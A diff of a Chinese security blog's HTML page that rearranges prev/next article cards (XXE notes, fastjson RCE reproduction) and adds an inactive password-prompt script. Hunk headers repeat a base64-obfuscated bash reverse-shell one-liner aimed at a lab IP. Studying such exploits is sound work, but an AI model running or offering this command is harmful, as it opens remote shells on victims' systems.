@@ -334,6 +334,19 @@
 </header>
 
     
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
 
 
 
@@ -661,60 +674,7 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEyOC8xMDAwMCAwPiYx}|{bas
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/02/03/xxe-xue-xi-bi-ji/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="xxe学习笔记">
-                        
-                        <span class="card-title">xxe学习笔记</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
-                                    学习笔记总结
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">xxe漏洞学习</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">
-                        <span class="chip bg-color">漏洞原理解析</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/01/12/hello-world/">
+                <a href="/2023/02/02/hello-world/">
                     <div class="card-image">
                         
                         
@@ -730,9 +690,9 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEyOC8xMDAwMCAwPiYx}|{bas
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-12
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-02
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -740,6 +700,60 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEyOC8xMDAwMCAwPiYx}|{bas
                             
                         </span>
                     </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/02/01/fastjson1-2-24rce-fu-xian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="fastjson漏洞复现">
+                        
+                        <span class="card-title">fastjson漏洞复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            fastjson复现
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
+                    </a>
+                    
                 </div>
                 
             </div>
